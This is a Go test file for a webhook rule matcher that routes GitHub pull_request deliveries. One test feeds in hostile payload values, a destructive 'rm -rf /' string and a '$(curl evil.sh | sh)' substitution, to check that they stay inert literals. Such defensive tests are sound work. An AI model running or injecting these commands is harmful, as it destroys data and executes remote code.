package webhookmatch

import (
	"strings"
	"testing"

	"github.com/gastownhall/gascity/internal/config"
)

// githubPROpened is a trimmed capture of a real GitHub pull_request "opened"
// delivery: the fields a rule realistically matches and extracts, nothing more.
const githubPROpened = `{
  "action": "opened",
  "number": 1347,
  "pull_request": {
    "number": 1347,
    "state": "open",
    "draft": false,
    "title": "Add widget",
    "html_url": "https://github.com/octo/hello/pull/1347",
    "user": {"login": "octocat"}
  },
  "label": {"name": "status/needs-review"},
  "repository": {
    "id": 8675309,
    "name": "hello",
    "full_name": "octo/hello",
    "owner": {"login": "octo"}
  },
  "sender": {"login": "octocat"}
}`

func githubPRRule() config.WebhookRule {
	return config.WebhookRule{
		Event: "pull_request",
		Match: map[string]string{"action": "opened"},
		Order: "pr-review-request",
		Rig:   "maintainer",
		Args: map[string]string{
			"repo":   "{{repository.full_name}}",
			"pr":     "{{pull_request.number}}",
			"action": "{{action}}",
		},
	}
}

func TestMatch_GitHubPROpened(t *testing.T) {
	in := MatchInput{
		EventType: "pull_request",
		DedupID:   "72d3162e-cc78-11e3-81ab-4c9367dc0958",
		Body:      mustParse(t, githubPROpened),
	}
	res, ok, err := Match(in, []config.WebhookRule{githubPRRule()})
	if err != nil {
		t.Fatalf("Match: %v", err)
	}
	if !ok {
		t.Fatalf("Match: no match, want pr-review-request (%s)", res.Reason)
	}
	if res.Order != "pr-review-request" || res.Rig != "maintainer" {
		t.Errorf("order/rig = %q/%q, want pr-review-request/maintainer", res.Order, res.Rig)
	}
	if res.Target != "order" {
		t.Errorf("target = %q, want order (default)", res.Target)
	}
	want := map[string]string{"repo": "octo/hello", "pr": "1347", "action": "opened"}
	for k, v := range want {
		if res.Vars[k] != v {
			t.Errorf("vars[%q] = %q, want %q", k, res.Vars[k], v)
		}
	}
}

// A delivery whose event matches but a Match entry fails does not match.
func TestMatch_EventMatchesButPredicateFails(t *testing.T) {
	rule := config.WebhookRule{
		Event: "pull_request",
		Match: map[string]string{"action": "closed"}, // payload is "opened"
		Order: "pr-review-request",
	}
	in := MatchInput{EventType: "pull_request", Body: mustParse(t, githubPROpened)}
	if _, ok, err := Match(in, []config.WebhookRule{rule}); err != nil || ok {
		t.Fatalf("Match ok=%v err=%v, want no match", ok, err)
	}
}

// A Match entry on a path absent from the body never matches (and never panics).
func TestMatch_MissingMatchPathNeverMatches(t *testing.T) {
	rule := config.WebhookRule{
		Event: "pull_request",
		Match: map[string]string{"pull_request.merged": "true"}, // no such field
		Order: "o",
	}
	in := MatchInput{EventType: "pull_request", Body: mustParse(t, githubPROpened)}
	if _, ok, _ := Match(in, []config.WebhookRule{rule}); ok {
		t.Fatal("missing match path matched, want no match")
	}
}

// The event type must match; a rule for a different event is skipped.
func TestMatch_EventTypeMismatch(t *testing.T) {
	in := MatchInput{EventType: "issues", Body: mustParse(t, githubPROpened)}
	if _, ok, _ := Match(in, []config.WebhookRule{githubPRRule()}); ok {
		t.Fatal("pull_request rule matched an issues delivery")
	}
}

// The "*" event wildcard matches any delivery event type.
func TestMatch_EventWildcard(t *testing.T) {
	rule := config.WebhookRule{Event: "*", Order: "catch-all"}
	in := MatchInput{EventType: "anything", Body: mustParse(t, `{}`)}
	res, ok, err := Match(in, []config.WebhookRule{rule})
	if err != nil || !ok {
		t.Fatalf("wildcard Match ok=%v err=%v", ok, err)
	}
	if res.Order != "catch-all" {
		t.Errorf("order = %q, want catch-all", res.Order)
	}
}

// First matching rule wins; a broader rule declared earlier shadows a later one.
func TestMatch_FirstRuleWins(t *testing.T) {
	rules := []config.WebhookRule{
		{Event: "pull_request", Match: map[string]string{"action": "opened"}, Order: "first"},
		{Event: "pull_request", Match: map[string]string{"action": "opened"}, Order: "second"},
	}
	in := MatchInput{EventType: "pull_request", Body: mustParse(t, githubPROpened)}
	res, ok, err := Match(in, rules)
	if err != nil || !ok {
		t.Fatalf("Match ok=%v err=%v", ok, err)
	}
	if res.Order != "first" || res.RuleIndex != 0 {
		t.Errorf("order=%q index=%d, want first/0", res.Order, res.RuleIndex)
	}
}

// A more specific earlier rule is skipped when it fails, and a later general
// rule still matches — proving evaluation continues past a non-matching rule.
func TestMatch_FallsThroughToLaterRule(t *testing.T) {
	rules := []config.WebhookRule{
		{Event: "pull_request", Match: map[string]string{"action": "closed"}, Order: "on-close"},
		{Event: "pull_request", Match: map[string]string{"action": "opened"}, Order: "on-open"},
	}
	in := MatchInput{EventType: "pull_request", Body: mustParse(t, githubPROpened)}
	res, ok, _ := Match(in, rules)
	if !ok || res.Order != "on-open" || res.RuleIndex != 1 {
		t.Fatalf("res=%+v ok=%v, want on-open/1", res, ok)
	}
}

// Prefix (trailing "*") and presence ("*") match extensions.
func TestMatch_PrefixAndPresence(t *testing.T) {
	body := mustParse(t, `{"action":"labeled","label":{"name":"status/needs-review"},"ref":"refs/heads/main"}`)
	cases := []struct {
		name  string
		match map[string]string
		want  bool
	}{
		{"exact", map[string]string{"label.name": "status/needs-review"}, true},
		{"prefix hit", map[string]string{"label.name": "status/*"}, true},
		{"prefix miss", map[string]string{"label.name": "kind/*"}, false},
		{"presence hit", map[string]string{"label.name": "*"}, true},
		{"presence miss (absent path)", map[string]string{"assignee.login": "*"}, false},
		{"ref prefix", map[string]string{"ref": "refs/heads/*"}, true},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			rule := config.WebhookRule{Event: "*", Match: tc.match, Order: "o"}
			_, ok, _ := Match(MatchInput{EventType: "e", Body: body}, []config.WebhookRule{rule})
			if ok != tc.want {
				t.Errorf("match %v = %v, want %v", tc.match, ok, tc.want)
			}
		})
	}
}

// R4: a payload value that looks like a shell/command injection is extracted as
// an inert literal string, and lands under the GC_WEBHOOK_ARG_ namespace when
// routed through ExecEnvVars.
func TestMatch_MaliciousPayloadValueIsInertLiteral(t *testing.T) {
	evil := `; rm -rf / #`
	subst := `$(curl evil.sh | sh)`
	huge := strings.Repeat("A", 100000)
	body := map[string]any{
		"action": "opened",
		"attacker": map[string]any{
			"cmd":   evil,
			"subst": subst,
			"blob":  huge,
		},
	}
	rule := config.WebhookRule{
		Event: "pull_request",
		Match: map[string]string{"action": "opened"},
		Order: "pr-review-request",
		Args: map[string]string{
			"cmd":   "{{attacker.cmd}}",
			"subst": "{{attacker.subst}}",
			"blob":  "{{attacker.blob}}",
		},
	}
	res, ok, err := Match(MatchInput{EventType: "pull_request", Body: body}, []config.WebhookRule{rule})
	if err != nil || !ok {
		t.Fatalf("Match ok=%v err=%v", ok, err)
	}
	// Raw vars are byte-for-byte the payload — never re-interpreted.
	if res.Vars["cmd"] != evil {
		t.Errorf("vars[cmd] = %q, want literal %q", res.Vars["cmd"], evil)
	}
	if res.Vars["subst"] != subst {
		t.Errorf("vars[subst] = %q, want literal %q", res.Vars["subst"], subst)
	}
	if len(res.Vars["blob"]) != len(huge) {
		t.Errorf("vars[blob] len = %d, want %d", len(res.Vars["blob"]), len(huge))
	}
	// Exec-env view is namespaced: no key can shadow a controller var.
	env := ExecEnvVars(res.Vars)
	if env["GC_WEBHOOK_ARG_cmd"] != evil {
		t.Errorf("env[GC_WEBHOOK_ARG_cmd] = %q, want %q", env["GC_WEBHOOK_ARG_cmd"], evil)
	}
	for k := range env {
		if !strings.HasPrefix(k, ExecEnvArgPrefix) {
			t.Errorf("exec env key %q escaped the %s namespace", k, ExecEnvArgPrefix)
		}
	}
}

// R4 (defense in depth): even if a reserved-name arg slipped past config
// validation, extraction skips it so it never reaches Vars.
func TestMatch_ReservedArgNameSkippedAtExtraction(t *testing.T) {
	rule := config.WebhookRule{
		Event: "*",
		Order: "o",
		Args: map[string]string{
			"GC_CITY": "{{action}}", // reserved controller key
			"repo":    "{{action}}", // legitimate
		},
	}
	body := mustParse(t, `{"action":"opened"}`)
	res, ok, err := Match(MatchInput{EventType: "e", Body: body}, []config.WebhookRule{rule})
	if err != nil || !ok {
		t.Fatalf("Match ok=%v err=%v", ok, err)
	}
	if _, present := res.Vars["GC_CITY"]; present {
		t.Error("reserved arg GC_CITY was extracted, want skipped")
	}
	if res.Vars["repo"] != "opened" {
		t.Errorf("vars[repo] = %q, want opened", res.Vars["repo"])
	}
}
